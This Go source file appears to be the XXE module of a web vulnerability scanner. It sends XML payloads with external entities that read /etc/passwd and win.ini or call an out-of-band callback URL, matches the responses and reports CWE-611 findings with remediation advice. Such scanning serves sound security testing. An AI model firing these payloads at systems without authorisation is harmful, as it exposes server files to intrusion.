package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"time"
)

type XXEModule struct{}

func NewXXEModule() *XXEModule {
	return &XXEModule{}
}

func (m *XXEModule) Name() string {
	return "xxe"
}

func (m *XXEModule) Description() string {
	return "XML External Entity (XXE) Injection & File Disclosure"
}

var (
	xxePasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
	xxeWinRegex    = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
)

func (m *XXEModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding

	xmlHeaders := map[string]string{
		"Content-Type": "application/xml",
		"Accept":       "application/xml, text/xml, */*",
	}

	// 1. Blind XXE via Out-of-band (OAST) listener
	if target.OAST != nil {
		probeID := target.OAST.GenerateProbeID()
		cbURL := target.OAST.CallbackURL(probeID)
		oastPayload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "%s"> ]>
<nflx><data>&xxe;</data></nflx>`, cbURL)

		_, _ = c.Request("POST", target.URL, oastPayload, xmlHeaders)
		if hit, ok := target.OAST.WaitForHit(probeID, 3*time.Second); ok && hit != nil {
			f := &Finding{
				Module:      m.Name(),
				Title:       "Blind XML External Entity (XXE) Injection (OAST Callback Confirmed)",
				Severity:    SeverityCritical,
				URL:         target.URL,
				Parameter:   "(XML Body)",
				Payload:     cbURL,
				Detail:      fmt.Sprintf("Server resolved external entity pointing to OAST callback handler for probe %s.", probeID),
				Evidence:    fmt.Sprintf("OAST hit from %s at %s (%s %s)", hit.RemoteAddr, hit.Timestamp.Format(time.RFC3339), hit.Method, hit.Path),
				Remediation: "Disable DTD processing and external entity resolution in all XML parsers.",
				CWEID:       611,
			}
			f.SetConfidence(ConfidenceConfirmed)
			findings = append(findings, f)
		}
	}

	// 2. Direct file reflection XXE
	xxePayloads := []struct {
		Name    string
		Payload string
		Regex   *regexp.Regexp
	}{
		{
			Name: "Linux /etc/passwd XXE",
			Payload: `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
				`<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` + "\n" +
				`<nflx><data>&xxe;</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Windows win.ini XXE",
			Payload: `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
				`<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>` + "\n" +
				`<nflx><data>&xxe;</data></nflx>`,
			Regex: xxeWinRegex,
		},
	}

	for _, item := range xxePayloads {
		resp, err := c.Request("POST", target.URL, item.Payload, xmlHeaders)
		if err != nil || resp == nil || resp.Body == "" {
			continue
		}

		if item.Regex.MatchString(resp.Body) {
			evidence := resp.Body
			if len(evidence) > 200 {
				evidence = evidence[:200]
			}
			f := &Finding{
				Module:      m.Name(),
				Title:       "XML External Entity (XXE) Injection",
				Severity:    SeverityCritical,
				URL:         target.URL,
				Parameter:   "(XML Body)",
				Payload:     item.Name,
				Detail:      "Arbitrary local file disclosure confirmed via XML External Entity (XXE) injection.",
				Evidence:    evidence,
				Remediation: "Disable DTD processing and external entity resolution in all XML parsers (e.g. setFeature disallow-doctype-decl).",
				CWEID:       611,
			}
			f.SetConfidence(ConfidenceConfirmed)
			findings = append(findings, f)
			break
		}
	}

	return findings, nil
}
